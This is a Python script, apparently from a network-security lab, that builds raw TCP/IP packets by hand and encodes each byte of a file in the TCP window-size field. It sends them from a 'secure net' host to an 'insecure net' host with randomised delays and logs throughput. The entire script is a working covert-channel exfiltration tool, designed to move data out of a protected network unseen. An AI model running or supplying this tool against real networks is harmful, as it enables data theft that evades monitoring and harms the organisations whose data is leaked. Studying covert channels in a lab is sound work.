#!/usr/bin/env python3
import os
import sys
import time
import random
import socket
import struct
import math
from ctypes import *

# Constants
DEST_PORT = 8888
SRC_PORT = 8888
PACKET_SIZE = 65535

# Pseudo header for TCP checksum calculation
class PseudoHeader(Structure):
    _fields_ = [
        ("src_addr", c_uint32),
        ("dst_addr", c_uint32),
        ("placeholder", c_uint8),
        ("protocol", c_uint8),
        ("tcp_len", c_uint16)
    ]

def checksum(data):
    """Calculate checksum of the given data"""
    if len(data) % 2 == 1:
        data += b'\0'
    s = sum(array('H', data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    s = ~s
    return socket.ntohs(s & 0xffff)

def get_usec():
    """Get current time in microseconds"""
    return int(time.time() * 1000000)

def send_covert_data(message, dest_ip, src_ip, delay_seconds=0.5, repeat=1, logfile_name="sent_log.csv"):
    """
    Send covert data using TCP window size
    
    Args:
        message (bytes): Data to send covertly
        dest_ip (str): Destination IP address
        src_ip (str): Source IP address
        delay_seconds (float): Mean delay between packets
        repeat (int): Number of times to repeat transmission
        logfile_name (str): Log file to write
    """
    # Create a raw socket
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    except socket.error as e:
        print(f"Error creating socket: {e}")
        print("Note: This script requires root privileges")
        sys.exit(1)
    
    # Tell kernel we'll add IP header
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    
    # Destination address
    dest_addr = (dest_ip, 0)  # Port is in the TCP header
    
    # Add EOF marker
    message = message + b'\x04'  # EOF
    
    # Open log file
    with open(logfile_name, "w") as logfile:
        logfile.write("run,index,ascii,time_us\n")
        
        for r in range(1, repeat + 1):
            print(f"\n[=== RUN {r} ===]")
            start_usec = get_usec()
            
            for i, char in enumerate(message):
                # Create IP header
                ip_ihl = 5
                ip_ver = 4
                ip_tos = 0
                ip_tot_len = 20 + 20  # IP header + TCP header
                ip_id = random.randint(0, 65535)
                ip_frag_off = 0
                ip_ttl = 64
                ip_proto = socket.IPPROTO_TCP
                ip_check = 0
                ip_saddr = socket.inet_aton(src_ip)
                ip_daddr = socket.inet_aton(dest_ip)
                
                ip_ihl_ver = (ip_ver << 4) + ip_ihl
                
                # Pack IP header
                ip_header = struct.pack('!BBHHHBBH4s4s',
                    ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, 
                    ip_proto, ip_check, ip_saddr, ip_daddr)
                
                # TCP header fields
                tcp_source = SRC_PORT
                tcp_dest = DEST_PORT
                tcp_seq = 2000 + i
                tcp_ack_seq = 0
                tcp_doff = 5  # Header length in 32-bit words
                tcp_flags = 0x10  # ACK flag
                tcp_window = char  # Covert data is embedded in window size
                tcp_check = 0
                tcp_urg_ptr = 0
                
                # TCP header packing (excluding checksum)
                tcp_offset_res = (tcp_doff << 4) + 0
                tcp_flags = tcp_flags
                
                tcp_header = struct.pack('!HHLLBBHHH',
                    tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res,
                    tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
                
                # TCP pseudo header for checksum calculation
                src_addr = socket.inet_aton(src_ip)
                dst_addr = socket.inet_aton(dest_ip)
                placeholder = 0
                protocol = socket.IPPROTO_TCP
                tcp_length = len(tcp_header)
                
                # Create pseudo packet for checksum calculation
                psh = struct.pack('!4s4sBBH', src_addr, dst_addr, placeholder, protocol, tcp_length)
                pseudo_packet = psh + tcp_header
                
                # Calculate TCP checksum
                tcp_check = checksum(pseudo_packet)
                
                # Construct TCP header again with correct checksum
                tcp_header = struct.pack('!HHLLBBHHH',
                    tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res,
                    tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
                
                # Final packet
                packet = ip_header + tcp_header
                
                # Send packet
                sock.sendto(packet, dest_addr)
                
                # Log
                usec = get_usec()
                logfile.write(f"{r},{i},{char},{usec}\n")
                
                if char >= 32 and char <= 126:
                    print(f"[>] Sent byte '{chr(char)}' ({char})")
                else:
                    print(f"[>] Sent byte [ASCII {char}]")
                
                # Add a random delay with exponential distribution
                rand_uniform = random.random()
                exp_delay = -math.log(1.0 - rand_uniform) * delay_seconds
                time.sleep(exp_delay)
            
            end_usec = get_usec()
            duration = (end_usec - start_usec) / 1000000.0
            throughput = len(message) / duration
            
            print(f"[✔] Run {r} complete: {duration:.2f} seconds, {throughput:.2f} bytes/sec")
    
    sock.close()
    print("[✔] Transmission complete.")

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <file_to_send> [--delay=0.5] [--repeat=1] [--logfile=sent_log.csv]")
        sys.exit(1)
    
    delay_seconds = 0.5
    repeat = 1
    logfile_name = "sent_log.csv"
    
    # Parse command line arguments
    for arg in sys.argv[2:]:
        if arg.startswith("--delay="):
            delay_seconds = float(arg[8:])
        elif arg.startswith("--repeat="):
            repeat = int(arg[9:])
        elif arg.startswith("--logfile="):
            logfile_name = arg[10:]
    
    # Read the file to send
    try:
        with open(sys.argv[1], "rb") as f:
            message = f.read()
    except Exception as e:
        print(f"Error reading file: {e}")
        sys.exit(1)
    
    # Get IP addresses from environment
    dest_ip = os.getenv('INSECURENET_HOST_IP')
    src_ip = os.getenv('SECURENET_HOST_IP')
    
    if not dest_ip or not src_ip:
        print("ENV INSECURENET_HOST_IP or SECURENET_HOST_IP not set")
        sys.exit(1)
    
    # Send the data
    send_covert_data(message, dest_ip, src_ip, delay_seconds, repeat, logfile_name)

if __name__ == "__main__":
    try:
        from array import array
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(0) 